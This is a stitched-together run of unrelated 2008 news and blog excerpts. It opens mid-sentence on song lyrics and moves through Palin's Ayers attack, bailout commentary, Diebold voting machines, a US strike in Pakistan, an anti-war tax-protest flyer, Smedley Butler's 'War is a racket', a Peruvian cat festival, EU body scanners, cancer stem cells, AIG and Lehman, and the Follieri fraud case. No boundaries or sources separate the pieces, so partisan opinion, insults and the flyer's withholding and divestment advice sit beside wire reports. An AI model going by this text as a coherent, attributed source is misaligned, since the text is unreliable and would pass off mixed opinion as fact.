Ray 's romantic track includes lyrics such as : " She gave me love and affection / I said I love her / She 's good to me " and " I 've been saved by a woman / She wo n't let me go / She wo n't let me go now . ”

In remarks at a Colorado airport hangar today , Gov. Sarah Palin tore into Senator Barack Obama with a twist that she ripped right from the headlines of this very newspaper .
Without apparently mentioning the name of William C. Ayers , a professor in Chicago who is a former member of the radical Weathermen , Ms. Palin said , according to a pool report from her appearance :
“ There is a lot of interest , I guess , in what I read and what I ’ve read lately .
Well , I was reading my copy of today ’s New York Times and I was interested to read about Barack ’s friends from Chicago .
“ I get to bring this up not to pick a fight , but it was there in the New York Times , so we are gonna talk about it .
Turns out one of Barack ’s earliest supporters is a man who , according to the New York Times , and they are hardly ever wrong , was a domestic terrorist and part of a group that quote launched a campaign of bombings that would target the Pentagon and US Capitol .
Wow .
These are the same guys who think patriotism is paying higher taxes .
“ This is not a man who sees America as you see it and how I see America .
We see America as the greatest force for good in this world .
If we can be that beacon of light and hope for others who seek freedom and democracy and can live in a country that would allow intolerance in the equal rights that again our military men and women fight for and die for for all of us .
Our opponent though , is someone who sees America it seems as being so imperfect that he ’s palling around with terrorists who would target their own country ? ”
The aforementioned article , by Scott Shane , delved into the relationship between Mr. Ayers and Mr. Obama , who together served on education boards in Chicago years ago .
Mr. Shane wrote :
A review of records of the schools project and interviews with a dozen people who know both men , suggest that Mr. Obama , 47 , has played down his contacts with Mr. Ayers , 63 .
But the two men do not appear to have been close .
Nor has Mr. Obama ever expressed sympathy for the radical views and actions of Mr. Ayers , whom he has called “ somebody who engaged in detestable acts 40 years ago , when I was 8 . ”
The Republican efforts to remind the voting public of Mr. Obama ’s old ties to Mr. Ayers and their mutual education projects in Chicago date back much farther than today , but they include a new McCain ad highlighting the relationship that is up on television .
And both the McCain campaign and the Republican National Committee have pumped out releases today listing articles , including Mr. Shane ’s , about Mr. Ayers .
Ms. Palin ’s line of attack also comes on the heels ( forgive us for that and we ’ll get back to those spikes in a minute ) of reports indicating that the McCain campaign may begin lobbing more negative critiques against the Democratic presidential nominee in the final month of this election cycle .
Or as Ms. Palin put it today , a donor had suggested that she get tougher on her opponents : “ And I turned to one of the staffers and said , ‘ O.K. they ’re serious ! ’
Jason the campaign staffer said , ‘ O.K. , let ’s look at it this way , Sarah , the gloves are off , the heels are on , let ’s get to work ! ’ ”
Would those be her blood - red heels ?
Just joking .
Hari Sevugan , a spokesman for the Obama campaign , fired back almost immediately in a statement : “ Governor Palin ’s comments , while offensive , are not surprising , given the McCain campaign ’s statement this morning that they would be launching Swiftboat - like attacks in hopes of deflecting attention from the nation ’s economic ills .
In fact , the very newspaper story Governor Palin cited in hurling her shameless attack made clear that Senator Obama is not close to Bill Ayers , much less ‘ pals , ’ and that he has strongly condemned the despicable acts Ayers committed 40 years ago , when Obama was eight .
What ’s clear is that John McCain and Sarah Palin would rather spend their time tearing down Barack Obama than laying out a plan to build up our economy . ”
So if Mr. Obama was 8 years old at the time , Ms. Palin was 5 ?
Just wondering .
At that airport hangar rally in Englewood , Colo. , Governor Palin was received enthusiastically in one of her rare appearances without her running mate , Senator John McCain .
Frances
Owens , the former Colorado first lady , lauded her : “ Since joining the Republican ticket , she has energized millions of voters … I am very honored to introduce to you a card - carrying , lipstick - wearing professional Republican woman who totally knocked it out of the park last Thursday . ”
She was referring to Ms. Palin ’s debate performance , which had been watched closely — and some would say nervously — by many Republicans who had been fretting over the stumbles she made in limited TV interviews during the last month .
Again today , as she said on Fox News yesterday , Ms. Palin alluded to her problems during those sessions ( with CBS ’ Katie Couric in particular ) , but excused them away as frustration on her part for being asked questions she did n’t feel were pertinent .
“ After that recent interview that was n’t so successful because as I admitted on Fox TV the other day , I was annoyed and I was impatient with some of the questions , and I need to learn to I guess hide to some of that annoyance , some of the annoyance with some of the questions I received was because I am so apparently outside the Washington elite and the media elite , that sometimes I do n’t understand why they are asking what they are asking when Americans want to talk about energy independence , they want to talk about how they are gonna be able to send their kids to college , to hear our solutions to challenges to health care , not necessarily , ‘ What publication did you read this morning ? ’
OK , so I was annoyed and I have to apologize for that . ”
( The hangar audience yelled “ NO ! ” at that point . )
Funny , she did n’t express that frustration when the TV journalists were “ playing stump the candidate , ” a phrase she used on the campaign trail as a challenge for folks to get to know her and her level of experience .
Nor did she change the subject in those television Q&A ’s as deftly as she managed to do during Thursday night ’s debate .
Perhaps this is the result of what former Gov. Mitt Romney and others were saying last week : Let Palin Be Palin .
Do n’t bottle her up , as the McCain campaign had done before the debate , some argued ; give her free rein to become accustomed to the give - and - take in the glare of a national spotlight .
Or as NBC ’s Matt Lauer asked Mr. Romney : Will Practice Make Perfect ?
I 'm more than a little queasy about this bail - out and this reader sums up my feelings almost perfectly :
After nearly eight years , the phrase " trust us " no longer works .
Now we 're presented with a historically unprecedented bailout proposal for the nation 's financial institutions .
I have a jumble of differing reactions to this .
First , for years the Republicans have sold us a deregulation mantra and suggested that any form of regulation is " socialism . "
But anyone who 's actually read Adam Smith knows that he and other philosophers of free markets made plain from the outset that the state needs to guard the integrity of the marketplace .
Smith says that there is a dark side to the entrepreneurial spirit that the state must guard against .
This is not a rejection of market economics -- it 's a protection of the market place against those who abuse the freedoms it offers .
We are again told that things are vastly complicated and we should trust Treasury and the Fed to do the right thing .
My trust reservoir is exhausted .
I actually respect Paulson , but I also believe he is " playing the hand he 's been dealt , " as he said .
This is not the way decisions should be taken that have long - term consequences for the nation 's future .
If in fact all of this bubbled to the surface quickly , without being anticipated , then the folks at Treasury are incompetent .
However , I do n't believe that for a second -- I am convinced that in this case , again , the Bush Administration knew what was up and calculated that it could just muddle through until after the elections .
We should all be apprehensive about what is coming after election day .
Third , the administration 's proposals continue a process of socializing loss and preserving profits and distributions , many of which were made with full knowledge of the pending losses .
When management distributes illusory profits to insiders in full knowledge of a massive loss , this is called a fraudulent conveyance , and in equity proceedings such distributions are routinely recovered for the creditor mass .
There should therefore be a careful scrutiny of distributions of profits and bonuses by failed firms .
The bailout we now see may mean effectively that taxpayer money is subsidizing the purchase of macmansions and Bentleys by investment managers who behaved irresponsibly .
How can that happen ?
Only in the age of Bush .
Fourth , I really started steaming this morning reading the NYT article about the participation of foreign banks in the bailout .
Granted that the US has an interest in protecting financial markets , but why should the US be bailing out German and UK firms ?
At least this should be a burden shared with their own governments .
This really needs to be subject to some probing questions .
What 's going on here ?
Believe it or not , The Daily Show creator and former Air America host Lizz Winstead created this video of Michelle Bachmann before she appeared on Hardball last week .
Oooh , baby , that 's all sorts of nuttiness .
I mean , that 's even more nutty than trolling Young Republican groups to find stories of teachers / administrators not looking favorably at conservative ideology .
Bachmann 's Democratic rival for her House seat representing the 6th District of Minnesota , Elwyn Tinkleberg , has received almost $ 1 million in donations since her appearance and the race has definitely trended away from Bachmann .
I 'm in two minds whether John McCain has lost his mind or never had a soul .
But I have to say I am surprised by the barrage of lies and distractions his campaign is throwing out .
The farce of the Palin candidacy is one such distraction - but the lies about sex education , the lies about Palin 's pork record , the lies about " tiny " Iran , the lies about the lipstick - pig nonsense , the lies about the bridge to nowhere , the lies about the oil pipeline ... I mean , what is going on ?
Some believe this is just GOP hardball .
But it actually is n't .
They 're usually not this stupid .
If you are going to broadcast a series of outrageous , demonstrable lies to smear your opponent , you tend to to that in the last two weeks of a campaign , so the lies can actually stick before they are debunked .
But in September ?
I know many people believe that the American people - especially the under - informed swing voters - are too dumb to know when they are being lied to .
But these lies are so obvious that this can not be true .
And the sheer viciousness of the personal attacks on Obama make Rove 's attack on McCain in 2000 seem mild .
Here 's what I think .
I think McCain is out of it .
I think he checked out of his own campaign and handed it over to Schmidt and his fellow Rovians .
This does not mean he does not have total responsibility .
John McCain is now for ever a despicable and dishonest and dishonorable man .
He has destroyed his reputation .
But he is also trying to do what he can to win this election .
My view is : if this is how he intends to win this election , he has mis-timed his lies .
So my assumption is that this is all about trying to get into Obama 's head and get him to make a mistake .
Which is why Obama needs now more than ever to stay calm and confident and focused .

A recent paper in the National Bureau of Economic Research titled “ Air Pollution and Infant Health : Lessons from New Jersey ” examined a large sample size of infants and mothers .
Using information from air quality monitors near children ’s residences , researchers discovered “ consistently negative effects of exposure to pollution , especially carbon monoxide , both during and after birth . ”
This really does n’t come as any big surprise to me , but research like this is important in substantiating why we need stricter clean air regulations .
Janet Currie , Matthew J. Neidell , and Johannes Schmieder examined three criteria in the study :
First , because we know the exact addresses of mothers , we select those mothers closest to air monitors to ensure a more accurate measure of air quality .
Second , since we follow mothers over time , we control for unobserved characteristics of mothers using maternal fixed effects .
Third , we examine interactions of air pollution with smoking and other predictors of poor infant health outcomes .
Data was collected from the 1990s .
The main culprit is car exhaust :
Because infants are small , and many have respiratory problems to begin with , CO may be particularly harmful to them .
Nationwide , 77 percent of CO comes from transportation sources , while as much as 90 percent of CO in cities comes from motor vehicle exhaust ( Environmental Protection Agency , January 1993 , 2003 b ) .
The implications are huge , as the authors conclude :
Our strongest and most consistent set of results show that CO has negative effects on infant health both before and after birth .
Since most CO emissions come from transportation sources , these findings are germane to the current contentious debate over proposals to further tighten automobile emissions standards .
I think this research is very important to the naysayers on global warming who oppose tighter pollution regulations .
If you do n’t believe in protecting our planet ’s health , what about our infants ’ health ?
I also find it ironic that many people who support the right to life do not support the right to a healthy life .

Disgraced E-Voting Vendor , With Admittedly Inaccurate Voting Systems , Seen Back on the Road for the Republican Candidate in the Buckeye State ...
Brad Friedman Byon 9/24/2008 , 11:46am PT
Jeff Johnson at " Urban In - Fill " points us to a photo he says was snapped recently in Columbus , Ohio ...
Click on the photo for a larger version , but if you can't tell , that 's a truck with a Diebold logo on the side , and a John McCain sticker on the back ...
As everyone in the world likely remembers by now , Diebold 's former CEO Walden O'Dell was a major George W. Bush backer who , in a 2003 Republican fundraising letter wrote that he was " committed to helping Ohio deliver its electoral votes to the president next year . "
Some time after that mission was accomplished , and Diebold 's 160 - year old , blue - chip good name was sent into the toilet , O'Dell was jettisoned amidst several ongoing fraud investigations , the new regime claimed they would impliment new regulations barring public support for political candidates .
Guess the memo has n't gotten fully out .
Or perhaps , now that they 've put lipstick on the Diebold pig ( disclaimer : this article has nothing to do with Sarah Palin ) , by changing the name of their elections division to " Premier " in hopes of fooling America again , the parent company Diebold has loosened their restrictions on supporting Republican campaigns in Ohio and elsewhere .
Diebold / Premier is currently being sued by Ohio Sec. of State Jennifer Brunner , in the wake of the company 's recent admission that the tabulator software on their voting systems --- both touch - screen and op - scan --- to be used in 34 states this November , does n't work , and drops thousands of votes without notice to the system operator .
In late 2007 , they also were forced to admit that the memory cards on their op - scan paper - ballot systems are prone to failure .
The same systems which were seen being hacked , via those memory cards , in HBO 's Emmy - nominated documentary Hacking Democracy ( video of that hack here . )
Prior to all of that , after we had supplied Princeton University with a Diebold touch - screen system , given to us by a Diebold insider , computer scientists there demonstrated that those machines were easily hacked with a vote - flipping virus which could pass itself from machine to machine and flip an entire county 's election without detection .
Oh , and that their machines , all across the country , used an identical key to open them up --- one which could be purchased at any office supply store , or simply created by hand from a photo of the key as seen on the company 's own website .
Other than that ... Heckuva job , Diebold !
Keep on truckin' !

The NATO operation in Afghanistan is spilling over in to Pakistan with devastating results .
On Wednesday this week a US air strike hit a Pakistani school in North Waziristan , killing eleven .
Unbelievably the response from intelligence officials was that the school had links with the Taliban .

ONLY YOU CAN END THIS WAR .

HERE'S HOW :
TAX PROTEST : Divest out of stocks and stock mutual funds , only fund 40 lK up to the match your company gives you and only in cash reserves fund or tax free treasury fund , a ROTH is permanently tax free .
Call your rep and tell them you refuse to get back in the market or participate in the economy until they repeal the bailout and Impeach .
IMMEDIATELY increase your W2 Withholding to 3 - 4 so that you are not loaning this govt your money .
CONSUMER FAST : Only buy what you need .
Always pay with cash .

Refinance loans through credit unions .

War is just a racket .
A racket is best described , I believe , as something that is not what it seems to the majority of people .
Only a small inside group knows what it is about .
It is conducted for the benefit of the very few at the expense of the masses .
I believe in adequate defense at the coastline and nothing else .
If a nation comes over here to fight , then we 'll fight .
The trouble with America is that when the dollar only earns six percent over here , then it gets restless and goes overseas to get 100 percent .
Then the flag follows the dollar and the soldiers follow the flag .
I would n't go to war again as I have done to protect some lousy investment of the bankers .
There are only two things we should fight for .
One is the defense of our homes , and the other is the Bill of Rights .
War for any other reason is simply a racket .
There is n't a trick in the racketeering bag that the military gang is blind to .
It has its " finger men " to point out enemies , its " muscle men " to destroy enemies , its " brain men " to plan war preparations , and a " Big Boss " Super - Nationalistic - Capitalism .
It may seem off for me , a military man , to adopt such a comparison .
Truthfulness compels me to .
I spent thirty - three years and four months in active military service as a member of this country 's most agile military force , the Marine Corps .
I served in all commissioned ranks from Second Lieutenant to Major - General .
And during that period , I spent most of my time being a high - class muscle - man for Big Business , for Wall Street , and for the Bankers .
In short , I was a racketeer , a gangster for capitalism .
I suspected I was just part of a racket at the time .
Now I am sure of it .
Like all the members of the military profession , I never had a thought of my own until I left the service .
My mental faculties remained in suspended animation while I obeyed the orders of higher - ups .
This is typical with everyone in the military service .

CANETE , Peru , Oct. 8 ( UPI ) --
An annual festival of fried cat - eating in Canete , Peru , has raised the ire of animal rights groups , officials with the groups said .
The " Gastronomical Festival of the Cat , " a two - day event at the end of September , involves the eating of specially bred cats that locals claim can cure bronchial disease and work as an aphrodisiac , The Sun reported Wednesday .

A spokesman for People for the Ethical Treatment of Animals sharply criticized the event .
" If Peruvians really eat poor old Moggy because they think his meat cures bronchitis , that 's about as bizarre as it gets , although remember that Asians eat monkey bits thinking that will cure their impotence and even Europeans butcher poor old Bessie the cow or Henny Penny the hen , because they see them as nothing more than a bit of nourishment , " the PETA spokesman said .

The scans effectively strip passengers and highlight anything they may carry
As if queuing for ages , emptying pockets and taking off shoes at the airport was not enough - now there are fears images of European airline passengers will be flashing up on a computer screen in all their glory - minus their clothes .
The European Commission insists the proposals are at an early stage and would not be mandatory .
But there are nonetheless concerns among some in the European Parliament about the effect the scanners could have on human rights , data protection and personal dignity .
The images , while not quite of photo quality , do not leave much to the imagination .
For most people , airport security staff would likely get to know you rather better than you might like .
' Ill conceived ' " This measure is unnecessary , unjustified and invasive , " said Irish Sinn Fein MEP Bairbre de Brun .
" The commission has brought forward this plan without assessing the impact on fundamental rights or human health or even if they are cost - efficient .
This is an ill - conceived plan . "
Tens of millions of people around European airports would be digitally photographed , almost as if they were naked
Marco Cappato , Italian Liberal MEP
The European Commission says it is precisely its role to ensure the scanners are not unnecessarily invasive - by drawing up a rule book for how the devices , which are already used in a limited capacity by some airports , must be operated .
Where the technology is currently available , air security officials can pick out individuals to stand in a booth while three pictures are taken of the person in slightly different positions .
Within seconds , an X - ray scanner produces an image of the body .
What shows up is the naked human form and anything that may be concealed , such as coins , a gun or drugs .
Hi -tech companies say the latest scanners show only an outline of the subject 's body , without anatomical detail .
' Virtual strip search ' A European Commission spokesman told the BBC that a wider roll - out of the technology would not only enhance safety and security , but would also have the potential to speed up the check - in process , as passengers would not need to be searched by security officials .
But concerns remain that the safeguards remain vague , and that MEPs have not been sufficiently consulted .
Philip Bradbourn , home affairs spokesman for the British Conservatives , says the scanners amount to a " virtual strip search " and are being rushed in .
European officials believe the X - ray scans could ease airport queues " The European Commission is attempting to introduce these measures without consulting national governments or MEPs , and that is simply unacceptable given the considerable concerns , " he said .
" There is a growing anxiety that the EU is seen as a tool for challenging basic liberties , without the usual scrutiny and accountability provided at the ballot box . "
He and other critics acknowledge the potential security benefits , but insist that is not enough .
" I am against the idea of deciding one way or the other without a proper analysis of risks and eventual benefits from the point of view of health , privacy and security , " Italian Liberal MEP Marco Cappato told the BBC .
" Tens of millions of people around European airports would be digitally photographed , almost as if they were naked . "
Step forward Antonio Tajani , Europe 's transport commissioner .
He is attempting to persuade MEPs this is not being rushed through , will not happen in every airport anytime soon , and the necessary safeguards will be a priority .
But for many MEPs , he has plenty of convincing to do .

EVERY age is afraid of plagues .
For the most part , such plagues have been infections .
The rich world , though , has brought infectious disease under control and , AIDS aside , the memory dims with every generation .
Instead , the fear of disease has transferred itself to cancer .
How to prevent it , and how to treat it if prevention has failed , fills the health pages of the newspapers .
How this or that celebrity won or lost his or her battle with it seems to fill much of the rest .
The military metaphor is not confined to newspapers .
It is 37 years since Richard Nixon , then America 's president , declared war on the disease .
During that time , the prognosis for cancer patients has got a lot better .
Scientists have refined old therapies and found new ones .
Moreover , governments have waged a relentless public - health campaign against the biggest cause of cancer — the smoking of tobacco .
The war , however , has never looked close to being won .
Scan the horizon and there is no sign of a cure .
Nor is there likely to be until the enemy is properly understood .
Though luck plays its part in medicine , as it does in warfare , the big breakthroughs usually come from dramatic shifts in understanding .
It was not , for example , until Louis Pasteur and Robert Koch proved the connection between germs and infection that doctors realised that to cure such diseases you had to kill the germs .
The germ theory of disease made sense of a collection of illnesses that obviously had things in common ( a tendency to appear in waves , for example , or to pass from person to person ) but were maddeningly different in their details .
It took a while , but proof of that theory led to antibiotics that can destroy a whole range of infections .
For cancer , a similar moment of enlightenment may now have arrived ( see article ) .
Like infections , cancers have prominent features in common , yet they are bafflingly different in their details .
But , borrowing an idea from another part of biology , oncologists are coming to believe that most — possibly all — cancers involve stem cells , or something very like them .
They are , in other words , caused and sustained by a small number of cells whose daughters grow into the tissue of a tumour rather as the daughters of healthy stem cells grow into the normal tissues that make up a body .
Patience , s'il vous plaît
This opens new ways of thinking about and treating the cancers .
If its stem cells are eradicated , the rest of a tumour may die off .
And if the secondary tumours — the truly feared killers in many forms of cancer — are the result of stem cells escaping from a primary tumour , as looks likely , then this knowledge may make them yield more easily to treatment .
This discovery is not a cure .
But it does point the way towards one — or , at the least , towards better therapies .
Some might be in action soon .
For example , it seems that cancer stem cells are less vulnerable to radiation than other cancer cells , because their DNA - repair mechanisms are better .
Radiotherapy might thus be made more effective against them by dosing them with existing drugs that inhibit DNA repair .
Some existing drugs which are known to interfere with stem cells ' biochemical pathways could be used to attack them selectively .
Other treatments will take far longer — the time needed for clinical trials would see to that and , in any case , a lot more research is in order .
And there is the problem of designing drugs that can distinguish between cancer stem cells and those that spin off healthy tissues .
But it all looks promising .
Blue sky ahead
The other interesting aspect of the stem - cell link is that it was inspired by work outside the mainstream of the huge cancer - research industry : stem - cell research is now a huge field in its own right .
In science you never know where the answer is going to come from .
Pasteur found it in a piece of practical science : he was trying to prevent food going off .
Charles Darwin , by contrast , found a lead for his theory of natural selection in the whimsical hobby of pigeon fancying , where the birds showed an enormous variety of form and behaviour .
And some discoveries happen by accident .
Radioactivity came to light a century after the discovery of uranium when Henri Becquerel used uranium salts and photographic plates in the same experiment and found that one fogged the other .
In the 19th century it was commonplace to do an experiment simply to see what would happen .
That was , in part , because experimenters were often amateurs who were spending private money .
In these days of taxpayer - financed science , most experiments are executed with a pretty clear idea of what the outcome ought to be , especially when they are part of wars and campaigns against this or that .
The paradox is that , although such efforts do not eliminate Becquerel - like discoveries , they risk limiting the chances of making them .
This accent on targeted research is understandable .
Plenty of the work now done on cancer will be of the targeted sort .
The Large Hadron Collider , the huge particle accelerator in Switzerland which was switched on this week ( see article ) , is a grand project that could yield all sorts of discoveries .
Yet the easiest way to sell it to politicians was to frame it as a search for a single particle , the Higgs boson .
Like natural selection and germs , the discovery of cancer stem cells illustrates how the most fruitful scientific findings are often not those of individual experiments , however intriguing , but those that organise knowledge into theory .
The chemical industry took off within a decade or so of Dmitri Mendeleev 's arrangement of the chemical elements into the periodic table , just as radio communications followed James Clerk Maxwell 's mathematical unification of electricity and magnetism , and antibiotics came after Pasteur and Koch .
With luck , something similar will soon happen in biology in the wake of such things as the Human Genome Project .
In retrospect , the discovery of stem cells — cancer stem cells included — may come to be seen as a step in a comprehensive theory of how organisms work .
That understanding would be a formidable , if unforeseen , part of the legacy of the war on cancer and an essential part of its mission to save lives .
NEW YORK ( CNNMoney.com ) -- " NO NO NO .
Not just no , but HELL NO , " writes Richard , a reader from Anchorage , Alaska .
" This is robbery pure and simple , " Anna from Denver posted on CNNMoney.com 's TalkBack blog this weekend .
" It 's our money !
Let these companies die , " added Claudio from Plainville , Conn .
After President Bush petitioned Congress Saturday for the authority to spend up to $ 700 billion to to bail out a financial industry on the verge of collapse , he said the high price tag was not only justified , but essential .
" It is a big package because it 's a big problem , " Bush told reporters at a news conference .
" The risk of doing nothing far outweighs the risk of the package . "
But when asked what they thought of the government 's proposal , most readers gave an overwhelming thumbs down .
" I 'm tired of rewarding institutions and people for the bad decisions they have made , " said Dean from Madison , Wis .
" Sure , it will hurt tax payers if / when some of these institutions fail , but perhaps we need to let that happen .
We do not need more big government involved in our lives .
Enough is enough . "
Do n't hand me the tab
Readers focused most of their indignation on having to foot the bill for irresponsible lenders and borrowers .
" Companies , like individuals , should be held responsible for their decisions , " wrote Jorge from El Paso , Texas .
" This buyout does not address the other problems in the pipeline such as personal credit default and market slowdowns in most industries .
No new jobs will be created . "
Paul from Portsmouth , N.H. , said banks are getting the soft treatment when taxpayers are suffering .
" It is time for the financial institutions of this country to be called to the mat .
We should be expecting and demanding responsible and ethical business practice , not rewarding it at the expense of taxpayers . "
And John from Springfield , Va. , said the government action actually hurts the people it is intended to help .
" The government does not have $ 700 billion dollars .
WE have $ 700 billion , and it is being taken from us .
If this is passed then the next administration and the next will be extracting this one from the people who are supposedly being protected by this bailout . "
Where 's my bailout ?
Other readers wanted to know why the government did n't spend the $ 700 billion investment on the majority of responsible Americans who are suffering because of the bad bets of the few .
" Why not take the billions and ... make funds available to home owners stuck in the loans these idiots created , marketed and sold , " asked Don from Coarsegold , Calif .
" It will put the money where it should be with the little guy who made a mistake , instead of the big guy who created the problem . "
Jordan from Charlestown , Ind. , asked why different rules applied to big banks and ordinary investors .
" Once I invested in something and lost money .
Maybe I could just change the rules of investing so that my loss turns into a gain ?
Oh , I forgot only banks can do that ! "
Vote these jerks out
Some readers said it was time for the politicians who support the bailout to get the heave - ho come November .
" I will be watching to see which of our representatives vote for this bailout , " said R. Kidd in Troy , N.C. " Let the American people see how many we can fire come election time . "
And many readers , including Danny from Texas said we should stop typing and start dialing the lawmakers who are prepared to give the OK to the bailout .
" Call your Congressman .
Stop blogging , posting comments , and call your congressman .
This is the patriotic thing to do .
Let them hear your opinion , show them this is still America and that you will not stand for this ! ! "
A necessary sacrifice
But not all readers agreed .
Some thought the bailout was an unfortunate but necessary move to rescue our financial system from collapse .
For instance , Bill from St. Louis said he changed his mind about the bailout when he realized the consequences of doing nothing .
" I was opposed to the bailout at first , but realized that the scope of this thing is global and so massive that the entire global economy could collapse if nothing was done .
... The priority has to be resolving the present crisis of confidence in our economy .
Remember , if Wall Street collapses , Main Street will go with it . "
Andy from Chicago said the cost to the taxpayer will not be what the headline number makes it seem .
" This money is not a handout to companies .
It 's simply giving banks and mortgage companies loans , since the banking system itself is too unstable to raise this kind of capital .
And no , the government cannot just use the $ 700 billion to pay back all the citizens that will be hurt by this .
If the companies like AIG fail , the cost will be far far greater than $ 700 billion .
Wake up !! "
And Surfta from Brooklyn , N.Y. , says the government action is really not a bailout at all .
" It 's NOT a bailout .
The government is not handing out cash , they actually stand to make a great deal of money out of this , which will trickle down to YOU .
First priority should be to try to control and fix the problem , then regulate sufficiently to make sure this NEVER happens again . "
NEW YORK ( Reuters ) - Insurer American International Group
Inc struggled for survival a day after a financial tsunami swept away investment bank Lehman Brothers and forced the sale of rival Merrill Lynch in the biggest financial industry shake - up since the Great Depression .
AIG scrambled for a financial lifeline on Monday after investment bank Lehman Brothers Holdings Inc failed to find a rescuer and Merrill Lynch & Co Inc agreed to be taken over by Bank of America Corp .
The U.S. Federal Reserve has hired investment bank Morgan Stanley to review options for AIG -- which has lost some 92 percent of its value so far this year -- a person familiar with the situation said Monday .
AIG ’s precipitous stock decline has led ratings agencies to threaten downgrades that could force it to post more collateral and nullify insurance contracts , possibly setting in motion a chain reaction that could threaten its survival .
In an ominous sign , two ratings agencies went ahead with downgrades after the market closed on Monday .
“ AIG seems to be the next guy on the chopping block , ” said Tom Sowanick , chief investment officer at Clearbrook Financial LLC in Princeton , New Jersey .
Again seeking a private solution to Wall Street ’s woes , the Fed had asked JPMorgan Chase & Co and Goldman Sachs Group Inc to explore arranging $ 70 billion to $ 75 billion in loans to support AIG , among other financing options , another person familiar with the situation said .
Fearing a financial meltdown , the U.S. presidential candidates sparred Monday over who could best restore the system ’s health , with Republican John McCain pledging reform and Democrat Barack Obama saying hands - off Republican policies were the problem .
U.S. stocks tumbled across the board , with the Dow Jones industrial average dropping 504 points as Wall Street had its worst day since markets reopened after the September 11 attacks .
There was speculation that Wall Street ’s worsening meltdown could prompt the Fed to act .
U.S. short - term interest rate futures rose sharply Monday , reflecting the higher prospects for a rate cut at or before Tuesday ’s Federal Reserve policy meeting .
And there were signs of widening macroeconomic shockwaves that could see a worsening of the credit crunch that has already threatened to worsen the housing downturn at the root of Wall Street ’s troubles .
“ Capital markets have been quite difficult , and this is just going to make it more so , ” General Motors Corp President and Chief Operating Officer Fritz Henderson told the Reuters Autos Summit in Detroit .
Darkening one of the few bright spots from the weekend ’s mayhem , Bank of America -- which would surpass Citigroup Inc as the country ’s largest bank by assets with the planned takeover of Merrill -- saw its shares plunge .
“ The concern for Bank of America is the debt that they are acquiring , ” said Marc Pado , U.S. market strategist at Cantor Fitzgerald & Co in San Francisco .
“ Secondly , is it too big of a purchase ?
They are dealing with Countrywide right now .
Did they need to be dealing with this as well ?
There ’s some concern they might have bit more than they could chew . ”

Late on Sunday , the Fed said for the first time it would accept stock in exchange for cash loans and 10 of the world ’s top banks agreed to establish a $ 70 billion emergency fund , with any one of them able to tap up to one - third of that .
But the market shrugged off those moves .
The Dow Jones industrial average closed down 4.4 percent , while the Standard & Poor ’s 500 Index lost 4.7 percent .
Lehman shares fell 95 percent to 18 cents , even as the once proud bank moved to sell 100 percent of its investment management unit and had a potential list of buyers , including private equity firms Bain Capital , Hellman & Friedman and Clayton Dubilier & Rice .
The events signaled a seismic shift in Wall Street ’s power structure , with big - name investment banks biting the dust and major banks with large deposit bases surviving .

“ It ’s a return to pure capitalism , the survival of the fittest .
The government ca n’t and wo n’t bail everybody out , ” said Justin Urquhart Stewart , investment director at 7 Investment Management in London .
“ Investors will now retreat to the trustworthy banks , though that ’s not a phrase that trips off the tongue easily nowadays . ”
‘ SHELL - SHOCKED ’
Scores of Lehman employees showed up at dawn at the company ’s New York headquarters , many dressed casually .
Most carried duffel bags and suitcases , as if they were planning to pack up and leave .
Merrill workers were also uncertain about their future .

New York Gov. David Paterson said Wall Street might lay off 40,000 workers in a worst - case scenario .
“ Everybody has been shell - shocked , ” a Merrill trader said on his way into the headquarters building .
“ Nobody thought we ’d be bought by Bank of America in a million years .
At least we wo n’t be bankrupt .
It should be a interesting day at work . ”
AIG could be the next U.S. financial giant to run into serious trouble .
U.S. Treasury Secretary Henry Paulson , who shocked many on Wall Street by insisting there would be no taxpayer funds to help Lehman , said at a news briefing there were private - sector talks under way in New York on AIG that had nothing to do with any government bridge loan .
“ What ’s going on in New York is a private sector effort , again , focused on dealing with an important issue that ’s , I think , important that the financial system work on right now , and there ’s not more I can say than that , ” he said .
The state of New York , where AIG is based , did its best to bolster the stricken insurer with a complex asset swap giving it a $ 20 billion lifeline , but its longer - term rescue depended on additional funding .
The cost to insure the debt of AIG also surged on Monday .
AIG ’s credit default swaps jumped to 33.5 percent of the sum insured paid upfront , plus annual premiums of 5 percent for five years , from 13 percent upfront on Friday , according to Markit Intraday .
In a move likely to drive that cost up further on Tuesday , Fitch Ratings downgraded AIG ’s debt to “ A ” from “ AA - ” and A.M.
Best cut its financial strength rating .
BANK SHARES DROP
U.S. bank shares tumbled in the wake of the Lehman news , with Washington Mutual Inc down 27 percent and Wachovia Corp losing 25 percent .
Morgan Stanley was down 13.5 percent , and Citigroup lost 15 percent .
Even Goldman Sachs , Wall Street ’s No. 1 investment bank which is set to report quarterly earnings on Tuesday , saw a 12 percent drop in its shares .
Merrill shares rose as much as 33 percent to $ 22.68 before closing at $ 17.06 , up a penny on the New York Stock Exchange .
The Bank of America offer was worth $ 29 a share when it was announced , almost $ 12 above Merrill ’s closing price on Friday .
Lehman ’s bankruptcy petition followed three days of talks between various bank CEOs and regulators at the Fed ’s fortress - like building in lower Manhattan .

Raffaello Follieri , perhaps most famous for being Anne Hathaway 's ex-boyfriend , has been sentenced to four and a half years in prison this Friday after being pleading guilty to one count of conspiring to commit wire fraud , eight counts of wire fraud and five counts of money laundering .
Raffaello Follieri , 30 , pleaded guilty in September to fraudulently obtaining US $ 2.4 million by leading investors to believe he had Vatican connections that enabled him to buy the Roman Catholic Church 's unwanted US properties at a discount .
...
" I have dishonored my family name and embarrassed the church I love , " Follieri told Judge John Koeltl in US District Court in Manhattan in a statement in Italian that was translated into English .
" I will never be able to wash away the stain .
I hope that someday those hurt by my actions will forgive me , " Follieri said before the judge handed down the sentence .
He 'll be deported after serving his sentence .
Follieri had good connections to both McCain and Rick Davis , for whom he had promised to " deliver Catholic votes " , and was the host of John McCain 's 70th birthday party , celebrated onboard the yacht of another dodgy character - a Russian oligarch who pretty much owns the tiny state of Montenegro .
In mid-September The Nation 's website published a photo of McCain celebrating his seventieth birthday in Montenegro in August 2006 at a yacht party hosted by convicted Italian felon Raffaello Follieri and his movie - star girlfriend Anne Hathaway .
On the same day one of the largest mega- yachts in the world , the Queen K , was moored in the same bay of Kotor .
This was where the real party was .
The owner of the Queen K was known as " Putin 's oligarch " : Oleg Deripaska , controlling shareholder of the Russian aluminum giant RusAl , currently listed as the ninth - richest man in the world , with a rap sheet as abundant as his wealth .
By mid-2005 Deripaska had already virtually taken control of Montenegro 's economy by snapping up its aluminum plant , KAP -- which accounts for up to 40 percent of the country 's GDP and some 80 percent of its export earnings -- in a nontransparent privatization tender strongly criticized by NGO watchdogs , Montenegrin politicians and journalists .
